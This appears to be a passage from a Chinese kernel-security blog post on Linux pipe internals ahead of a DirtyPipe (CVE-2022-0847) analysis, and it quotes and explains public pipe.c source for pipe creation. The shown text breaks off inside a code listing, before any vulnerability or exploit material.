<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8" />
        
      <meta name="description" content="Boom? PWN ! ! !" />
      
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>内核审计笔记 pipe.c, splice.c &amp;&amp; CVE-2022-0847 DirtyPipe分析 |  北极落小雪</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
  </html>
</html>


<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="app">
    
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-CVE-2022-0847 DirtyPipe"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  内核审计笔记 pipe.c, splice.c &amp;&amp; CVE-2022-0847 DirtyPipe分析
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/CVE-2022-0847%20DirtyPipe/" class="article-date">
  <time datetime="2024-05-09T16:00:00.000Z" itemprop="datePublished">2024-05-10</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Pwn/">Pwn</a> / <a class="article-category-link" href="/categories/Pwn/Kernel/">Kernel</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">5.8k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">31 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <p>只是阅读源码时的笔记..顺道复现了拖了很久的DirtyPipe.</p>
<span id="more"></span>
<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> {</span><br><span class="line">	.open		= fifo_open,</span><br><span class="line">	.llseek		= no_llseek,</span><br><span class="line">	.read_iter	= pipe_read,</span><br><span class="line">	.write_iter	= pipe_write,</span><br><span class="line">	.poll		= pipe_poll,</span><br><span class="line">	.unlocked_ioctl	= pipe_ioctl,</span><br><span class="line">	.release	= pipe_release,</span><br><span class="line">	.fasync		= pipe_fasync,</span><br><span class="line">	.splice_write	= iter_file_splice_write,</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<h2 id="pipe的创建-pipe-pipe2"><a href="#pipe的创建-pipe-pipe2" class="headerlink" title="pipe的创建(pipe,pipe2)"></a>pipe的创建(pipe,pipe2)</h2><p>pipe和pipe2的系统调用都转到do_pipe2处理.调用__do_pipe_flags完成pipe的创建,然后将文件描述符拷贝到用户,如果成功则调用fd_install使文件描述符生效.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">///home/znl/SkyAsk/Binarysafe/Kernel/linux-5.11.1/fs/pipe.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sys_pipe() is the normal C calling standard for creating</span></span><br><span class="line"><span class="comment"> * a pipe. It's not the way Unix traditionally does this, though.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_pipe2</span><span class="params">(<span class="type">int</span> __user *fildes, <span class="type">int</span> flags)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">files</span>[2];</span></span><br><span class="line">	<span class="type">int</span> fd[<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">	error = __do_pipe_flags(fd, files, flags);</span><br><span class="line">	<span class="keyword">if</span> (!error) {</span><br><span class="line">		<span class="keyword">if</span> (unlikely(copy_to_user(fildes, fd, <span class="keyword">sizeof</span>(fd)))) {</span><br><span class="line">			fput(files[<span class="number">0</span>]);</span><br><span class="line">			fput(files[<span class="number">1</span>]);</span><br><span class="line">			put_unused_fd(fd[<span class="number">0</span>]);</span><br><span class="line">			put_unused_fd(fd[<span class="number">1</span>]);</span><br><span class="line">			error = -EFAULT;</span><br><span class="line">		} <span class="keyword">else</span> {</span><br><span class="line">			fd_install(fd[<span class="number">0</span>], files[<span class="number">0</span>]);</span><br><span class="line">			fd_install(fd[<span class="number">1</span>], files[<span class="number">1</span>]);</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE2(pipe2, <span class="type">int</span> __user *, fildes, <span class="type">int</span>, flags)</span><br><span class="line">{</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, flags);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE1(pipe, <span class="type">int</span> __user *, fildes)</span><br><span class="line">{</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, <span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>fd_install 将当前任务的文件描述符表中fd的对应表项与该文件关联.<br>先从该任务的task_struct中获取打开文件表,再从打开文件表中获取到文件描述符表.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Install a file pointer in the fd array.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The VFS is full of places where we drop the files lock between</span></span><br><span class="line"><span class="comment"> * setting the open_fds bitmap and installing the file in the file</span></span><br><span class="line"><span class="comment"> * array.  At any such point, we are vulnerable to a dup2() race</span></span><br><span class="line"><span class="comment"> * installing a file in the array before us.  We need to detect this and</span></span><br><span class="line"><span class="comment"> * fput() the struct file we are about to overwrite in this case.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * It should never happen - if we allow dup2() do it, _really_ bad things</span></span><br><span class="line"><span class="comment"> * will follow.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This consumes the "file" refcount, so callers should treat it</span></span><br><span class="line"><span class="comment"> * as if they had called fput(file).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fd_install</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> =</span> current-&gt;files;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span>;</span></span><br><span class="line"></span><br><span class="line">	rcu_read_lock_sched();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(files-&gt;resize_in_progress)) {</span><br><span class="line">		rcu_read_unlock_sched();</span><br><span class="line">		spin_lock(&amp;files-&gt;file_lock);</span><br><span class="line">		fdt = files_fdtable(files);</span><br><span class="line">		BUG_ON(fdt-&gt;fd[fd] != <span class="literal">NULL</span>);</span><br><span class="line">		rcu_assign_pointer(fdt-&gt;fd[fd], file);</span><br><span class="line">		spin_unlock(&amp;files-&gt;file_lock);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	}</span><br><span class="line">	<span class="comment">/* coupled with smp_wmb() in expand_fdtable() */</span></span><br><span class="line">	smp_rmb();</span><br><span class="line">	fdt = rcu_dereference_sched(files-&gt;fdt);</span><br><span class="line">	BUG_ON(fdt-&gt;fd[fd] != <span class="literal">NULL</span>);</span><br><span class="line">	rcu_assign_pointer(fdt-&gt;fd[fd], file);</span><br><span class="line">	rcu_read_unlock_sched();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(fd_install);</span><br></pre></td></tr></tbody></table></figure>


<p>__do_pipe_flags函数: </p>
<ul>
<li>检查flags合法性</li>
<li>create_pipe_files创建pipe文件</li>
<li>获取两个未用的文件描述符.<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __do_pipe_flags(<span class="type">int</span> *fd, <span class="keyword">struct</span> file **files, <span class="type">int</span> flags)</span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> error;</span><br><span class="line">	<span class="type">int</span> fdw, fdr;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~(O_CLOEXEC | O_NONBLOCK | O_DIRECT | O_NOTIFICATION_PIPE))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	error = create_pipe_files(files, flags);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">	error = get_unused_fd_flags(flags);</span><br><span class="line">	<span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_read_pipe;</span><br><span class="line">	fdr = error;</span><br><span class="line"></span><br><span class="line">	error = get_unused_fd_flags(flags);</span><br><span class="line">	<span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_fdr;</span><br><span class="line">	fdw = error;</span><br><span class="line"></span><br><span class="line">	audit_fd_pair(fdr, fdw);</span><br><span class="line">	fd[<span class="number">0</span>] = fdr;</span><br><span class="line">	fd[<span class="number">1</span>] = fdw;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err_fdr:</span><br><span class="line">	put_unused_fd(fdr);</span><br><span class="line"> err_read_pipe:</span><br><span class="line">	fput(files[<span class="number">0</span>]);</span><br><span class="line">	fput(files[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<p>create_pipe_files函数</p>
<ul>
<li>get_pipe_inode分配inode及pipe本体(pipe_inode_info结构),完成初始化并将二者关联.</li>
<li>alloc_file_pseudo分配一个虚拟文件并与管道的inode关联.</li>
<li>克隆该虚拟文件作为管道的另一端</li>
<li>stream_open将文件设置为流文件(not seekable and don’t have notion of position)<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *	@mutex: mutex protecting the whole thing</span></span><br><span class="line"><span class="comment"> *	@rd_wait: reader wait point in case of empty pipe</span></span><br><span class="line"><span class="comment"> *	@wr_wait: writer wait point in case of full pipe</span></span><br><span class="line"><span class="comment"> *	@head: The point of buffer production</span></span><br><span class="line"><span class="comment"> *	@tail: The point of buffer consumption</span></span><br><span class="line"><span class="comment"> *	@note_loss: The next read() should insert a data-lost message</span></span><br><span class="line"><span class="comment"> *	@max_usage: The maximum number of slots that may be used in the ring</span></span><br><span class="line"><span class="comment"> *	@ring_size: total number of buffers (should be a power of 2)</span></span><br><span class="line"><span class="comment"> *	@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *	@tmp_page: cached released page</span></span><br><span class="line"><span class="comment"> *	@readers: number of current readers of this pipe</span></span><br><span class="line"><span class="comment"> *	@writers: number of current writers of this pipe</span></span><br><span class="line"><span class="comment"> *	@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *	@r_counter: reader counter</span></span><br><span class="line"><span class="comment"> *	@w_counter: writer counter</span></span><br><span class="line"><span class="comment"> *	@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *	@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *	@bufs: the circular array of pipe buffers</span></span><br><span class="line"><span class="comment"> *	@user: the user who created this pipe</span></span><br><span class="line"><span class="comment"> *	@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> {</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_pipe_files</span><span class="params">(<span class="keyword">struct</span> file **res, <span class="type">int</span> flags)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> get_pipe_inode();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line">	<span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!inode)</span><br><span class="line">		<span class="keyword">return</span> -ENFILE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; O_NOTIFICATION_PIPE) {</span><br><span class="line">		error = watch_queue_init(inode-&gt;i_pipe);</span><br><span class="line">		<span class="keyword">if</span> (error) {</span><br><span class="line">			free_pipe_info(inode-&gt;i_pipe);</span><br><span class="line">			iput(inode);</span><br><span class="line">			<span class="keyword">return</span> error;</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	f = alloc_file_pseudo(inode, pipe_mnt, <span class="string">""</span>,</span><br><span class="line">				O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),</span><br><span class="line">				&amp;pipefifo_fops);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(f)) {</span><br><span class="line">		free_pipe_info(inode-&gt;i_pipe);</span><br><span class="line">		iput(inode);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(f);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	f-&gt;private_data = inode-&gt;i_pipe;</span><br><span class="line"></span><br><span class="line">	res[<span class="number">0</span>] = alloc_file_clone(f, O_RDONLY | (flags &amp; O_NONBLOCK),</span><br><span class="line">				  &amp;pipefifo_fops);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(res[<span class="number">0</span>])) {</span><br><span class="line">		put_pipe_info(inode, inode-&gt;i_pipe);</span><br><span class="line">		fput(f);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(res[<span class="number">0</span>]);</span><br><span class="line">	}</span><br><span class="line">	res[<span class="number">0</span>]-&gt;private_data = inode-&gt;i_pipe;</span><br><span class="line">	res[<span class="number">1</span>] = f;</span><br><span class="line">	stream_open(inode, res[<span class="number">0</span>]);</span><br><span class="line">	stream_open(inode, res[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * stream_open is used by subsystems that want stream-like file descriptors.</span></span><br><span class="line"><span class="comment"> * Such file descriptors are not seekable and don't have notion of position</span></span><br><span class="line"><span class="comment"> * (file.f_pos is always 0 and ppos passed to .read()/.write() is always NULL).</span></span><br><span class="line"><span class="comment"> * Contrary to file descriptors of other regular files, .read() and .write()</span></span><br><span class="line"><span class="comment"> * can run simultaneously.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * stream_open never fails and is marked to return int so that it could be</span></span><br><span class="line"><span class="comment"> * directly used as file_operations.open .</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">stream_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span></span><br><span class="line">{</span><br><span class="line">	filp-&gt;f_mode &amp;= ~(FMODE_LSEEK | FMODE_PREAD | FMODE_PWRITE | FMODE_ATOMIC_POS);</span><br><span class="line">	filp-&gt;f_mode |= FMODE_STREAM;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(stream_open);</span><br></pre></td></tr></tbody></table></figure>

<p>get_pipe_inode函数:</p>
<ul>
<li>new_inode_pseudo分配虚拟的inode.</li>
<li>alloc_pipe_info创建pipe本体pipe_inode_info<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> inode * <span class="title function_">get_pipe_inode</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> new_inode_pseudo(pipe_mnt-&gt;mnt_sb);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!inode)</span><br><span class="line">		<span class="keyword">goto</span> fail_inode;</span><br><span class="line"></span><br><span class="line">	inode-&gt;i_ino = get_next_ino();</span><br><span class="line"></span><br><span class="line">	pipe = alloc_pipe_info();</span><br><span class="line">	<span class="keyword">if</span> (!pipe)</span><br><span class="line">		<span class="keyword">goto</span> fail_iput;</span><br><span class="line"></span><br><span class="line">	inode-&gt;i_pipe = pipe;</span><br><span class="line">	pipe-&gt;files = <span class="number">2</span>;</span><br><span class="line">	pipe-&gt;readers = pipe-&gt;writers = <span class="number">1</span>;</span><br><span class="line">	inode-&gt;i_fop = &amp;pipefifo_fops;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Mark the inode dirty from the very beginning,</span></span><br><span class="line"><span class="comment">	 * that way it will never be moved to the dirty</span></span><br><span class="line"><span class="comment">	 * list because "mark_inode_dirty()" will think</span></span><br><span class="line"><span class="comment">	 * that it already _is_ on the dirty list.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	inode-&gt;i_state = I_DIRTY;</span><br><span class="line">	inode-&gt;i_mode = S_IFIFO | S_IRUSR | S_IWUSR;</span><br><span class="line">	inode-&gt;i_uid = current_fsuid();</span><br><span class="line">	inode-&gt;i_gid = current_fsgid();</span><br><span class="line">	inode-&gt;i_atime = inode-&gt;i_mtime = inode-&gt;i_ctime = current_time(inode);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> inode;</span><br><span class="line"></span><br><span class="line">fail_iput:</span><br><span class="line">	iput(inode);</span><br><span class="line"></span><br><span class="line">fail_inode:</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<p>alloc_pipe_info函数.</p>
<ul>
<li>kzalloc分配pipe_inode_info的空间</li>
<li>kcalloc分配pipe_buffer的空间(下面具体分析).<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 